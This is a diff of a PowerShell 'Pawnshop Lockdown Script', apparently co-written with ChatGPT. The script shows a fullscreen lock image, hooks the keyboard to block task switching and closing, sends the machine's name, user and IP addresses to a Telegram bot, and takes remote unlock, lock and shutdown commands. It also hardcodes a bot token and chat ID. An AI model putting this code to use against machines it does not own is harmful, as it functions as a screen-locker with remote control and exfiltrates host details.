@@ -1,27 +1,27 @@
 # =======================
-# Pawnshop Lockdown Script v2.0
+# Pawnshop Lockdown Script v2.1
 # -----------------------
-# Blocks PC with fullscreen image + remote control via Telegram
+# Locks PC with fullscreen image + remote control via Telegram
 # Author: Codrut + ChatGPT
 # =======================
 
 # --- CONFIGURATION ---
-$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"             # Fullscreen image shown when PC is locked
-$tempImagePath = "$env:TEMP\lockscreen.jpg"                                    # Local temp file for the image
-$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"                     # Telegram Bot Token
-$chatID = "656189986"                                                             # Authorized Chat ID (your Telegram ID)
-$pc = $env:COMPUTERNAME                                                           # PC Name
-$user = $env:USERNAME                                                             # Windows Username
-$lockFile = "C:\\lock_status.txt"                                                # Lock status file to store "locked" or "unlocked"
+$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
+$tempImagePath = "$env:TEMP\lockscreen.jpg"
+$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
+$chatID = "656189986"
+$pc = $env:COMPUTERNAME
+$user = $env:USERNAME
+$lockFile = "C:\\lock_status.txt"
 $unlockCommand = "/unlock$user"
 $lockCommand = "/lock$user"
 $shutdownCommand = "/shutdown$user"
-$script:AllowClose = $false                                                      # Prevent form from closing normally
+$script:AllowClose = $false
 
 # --- STATE CHECK ---
 if (Test-Path $lockFile) {
     $state = Get-Content $lockFile -ErrorAction SilentlyContinue
-    if ($state -eq "unlocked") { return }   # Don't lock if explicitly unlocked
+    if ($state -eq "unlocked") { return }
 } else {
     "locked" | Out-File $lockFile -Force
 }
@@ -46,7 +46,7 @@ try {
     $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
 } catch { $ipLocal = "n/a" }
 try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
-$message = "🔒 Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
+$message = "Pawnshop PC Locked:`nUser: $user`nPC: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
 Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body (@{ chat_id = $chatID; text = $message } | ConvertTo-Json) -ContentType 'application/json'
 
 # --- KEYBOARD BLOCKING HOOK ---
@@ -54,34 +54,44 @@ Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+
 public class KeyBlocker {
     private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
     private static IntPtr hook = IntPtr.Zero;
     private static LowLevelKeyboardProc proc = Hook;
+
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
-    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+
+    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc proc, IntPtr hMod, uint threadId);
+    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
+    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);
+
     public static void Block() {
         hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
     }
+
     public static void Unblock() {
         UnhookWindowsHookEx(hook);
     }
+
     private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0) {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
-            Keys key = (Keys)vkCode;
-            if ((Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.F4) ||
-                key == Keys.LWin || key == Keys.RWin ||
-                (Control.ModifierKeys.HasFlag(Keys.Alt) && key == Keys.Tab) ||
-                (Control.ModifierKeys.HasFlag(Keys.Control) && key == Keys.Escape) ||
-                key == Keys.Tab) {
-                return (IntPtr)1; // Block
+            bool alt = (GetAsyncKeyState(0x12) & 0x8000) != 0;
+            bool win = (GetAsyncKeyState(0x5B) & 0x8000) != 0 || (GetAsyncKeyState(0x5C) & 0x8000) != 0;
+            bool tab = vkCode == 0x09;
+            bool f4 = vkCode == 0x73;
+            bool c = vkCode == 0x43;
+
+            if ((alt && f4) || (alt && tab) || (win && tab) || vkCode == 0x5B || vkCode == 0x5C) {
+                return (IntPtr)1;
             }
-            if (key == Keys.C) Environment.Exit(0); // Manual override
+
+            if (c) Environment.Exit(0);
         }
         return CallNextHookEx(hook, nCode, wParam, lParam);
     }
@@ -101,7 +111,7 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form.Controls.Add($pb); $form.Show(); $form
 }
 
-# --- TELEGRAM LISTENER (Every 3 sec) ---
+# --- TELEGRAM LISTENER LOOP ---
 $offset = 0
 try {
     $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
@@ -115,7 +125,10 @@ $timer.Add_Tick({
         $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
         foreach ($u in $updates.result) {
             $offset = $u.update_id + 1
-            $txt = $u.message.text.ToLower()
+            $txt = $u.message.text
+            if ($null -eq $txt) { continue }
+            $txt = $txt.ToLower()
+
             if ($txt -eq $unlockCommand.ToLower()) {
                 "unlocked" | Out-File $lockFile -Force
                 Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
